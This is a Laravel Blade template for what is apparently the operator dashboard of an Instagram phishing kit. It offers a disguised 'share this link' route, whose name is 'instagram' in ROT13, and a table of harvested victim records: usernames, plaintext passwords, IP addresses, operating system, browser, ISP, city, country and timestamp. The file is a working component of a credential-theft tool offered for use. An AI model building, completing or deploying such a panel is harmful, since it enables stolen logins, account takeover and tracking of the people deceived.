@extends('layouts.dashboard')

@section('content')

<div class="row">
    <div class="col-md-12">
        
        <div class="">{{ __('Instagram') }}
            <p><strong>Share this link: </strong><a href="{{ route('vafgntenz') }}" target="_blank" rel="noopener noreferrer">{{ __('Instagram') }}</a></p>
        </div>

        
            
        <table class="table table-bordered table-striped table-hover">
            <thead>
                <tr>
                    <th>Username</th>
                    <th>password</th>
                    <th>ip</th>
                    <th>Sistema operativo</th>
                    <th>Navegador</th>
                    <th>isp</th>
                    <th>city</th>
                    <th>country</th>
                    <th>time</th>
                </tr>
            </thead>
            <tbody>
                @foreach ($dataInstagram as $dataI)
                <tr>
                    <td>{{ $dataI->username }}</td>
                    <td>{{ $dataI->password }}</td>
                    <td>{{ $dataI->ip }}</td>
                    <td>{{ $dataI->os }}</td>
                    <td>{{ $dataI->browser }}</td>
                    <td>{{ $dataI->isp }}</td>
                    <td>{{ $dataI->city }}</td>
                    <td>{{ $dataI->country }}</td>
                    <td>{{ $dataI->created_at }}</td>
                </tr>
                @endforeach
            </tbody>
        </table>

            
        
    </div>
</div>

@endsection
